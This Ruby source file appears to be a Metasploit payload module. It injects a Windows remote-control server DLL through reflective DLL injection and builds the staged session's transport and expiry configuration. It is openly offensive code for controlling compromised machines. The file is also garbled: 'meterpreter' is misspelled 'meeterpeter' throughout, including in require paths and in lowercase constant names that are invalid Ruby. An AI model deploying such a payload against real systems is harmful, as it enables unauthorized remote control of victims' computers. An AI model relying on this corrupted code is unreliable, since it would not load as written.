##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/payload/windows/meeterpeter_loader'
require 'msf/base/sessions/meeterpeter_x86_win'
require 'msf/base/sessions/meeterpeter_options'
require 'rex/payloads/meeterpeter/config'

###
#
# Injects the meeterpeter server DLL via the Reflective Dll Injection payload
# along with transport related configuration.
#
###

module Metasploit4

  include Msf::Payload::Windows::meeterpeterLoader
  include Msf::Sessions::meeterpeterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows meeterpeter (Reflective Injection)',
      'Description'   => 'Inject the meeterpeter server DLL via the Reflective Dll Injection payload (staged)',
      'Author'        => ['skape','sf'],
      'PayloadCompat' => { 'Convention' => 'sockedi', },
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::meeterpeter_x86_Win))
  end

  def stage_payload(opts={})
    stage_meeterpeter + generate_config(opts)
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      arch:       opts[:uuid].arch,
      exitfunk:   datastore['EXITFUNC'],
      expiration: datastore['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: [transport_config(opts)],
      extensions: []
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::meeterpeter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

end
